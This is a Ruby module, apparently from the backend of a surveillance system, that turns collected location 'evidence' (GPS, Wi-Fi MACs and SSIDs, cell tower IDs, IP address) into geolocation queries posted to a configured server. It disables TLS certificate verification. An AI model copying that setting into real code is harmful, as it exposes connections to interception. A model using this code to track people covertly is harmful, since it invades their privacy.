require 'eventmachine'
require 'em-http-request'

require 'rcs-common/trace'

require_relative 'single_evidence'

module RCS
module LocationProcessing
  extend SingleEvidence
  include EventMachine::Protocols
  include RCS::Tracer
  
  def process
    puts "POSITION: #{@info[:data]}"
    
    case @info[:data][:type]
      when 'GPS'
        q = {map: {location: {latitude: @info[:data][:latitude], longitude: @info[:data][:longitude]}}}
      when 'WIFI'
        towers = []
        @info[:data][:wifi].each do |wifi|
          towers << {mac_address: wifi[:mac], signal_strength: wifi[:sig], ssid: wifi[:bssid]}
        end
        q = {map: {wifi_towers: towers}}
      when 'GSM'
        q = {map: {cell_towers: [
            {mobile_country_code: @info[:data][:cell][:mcc], mobile_network_code: @info[:data][:cell][:mnc], location_area_code: @info[:data][:cell][:lac], cell_id: @info[:data][:cell][:cid], signal_strength: @info[:data][:cell][:db], timing_advance: @info[:data][:cell][:adv], age: @info[:data][:cell][:age]}
            ], radio_type: 'gsm'}}
      when 'CDMA'
         q = {map: {cell_towers: [
            {mobile_country_code: @info[:data][:cell][:mcc], mobile_network_code: @info[:data][:cell][:mnc], location_area_code: @info[:data][:cell][:lac], cell_id: @info[:data][:cell][:cid], signal_strength: @info[:data][:cell][:db], timing_advance: @info[:data][:cell][:adv], age: @info[:data][:cell][:age]}
            ], radio_type: 'cdma'}}
      when 'IPv4'
        q = {map: {ip_address: {ipv4: @info[:data][:ip]}}}
    end

    http = Net::HTTP.new(RCS::DB::Config.instance.global['CN'], RCS::DB::Config.instance.global['LISTENING_PORT'])
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    
    res = http.request_post('/location', q.to_json)
    reply = JSON.parse(res.body)
    @info[:data].merge!(reply)
    
=begin
    ssl_opts = {:verify_peer => false}
    http = EM::HttpRequest.new("https://#{RCS::DB::Config.instance.global['CN']}:#{RCS::DB::Config.instance.global['LISTENING_PORT']}/location").post :body => q.to_json, :ssl => ssl_opts
    http.callback do
      reply = JSON.parse(http.response)
      @info[:data].merge!(reply)
      save
    end
    http.errback do
      # do nothing
    end
=end

  end
  
  def type
    :position
  end
end # ApplicationProcessing
end # DB
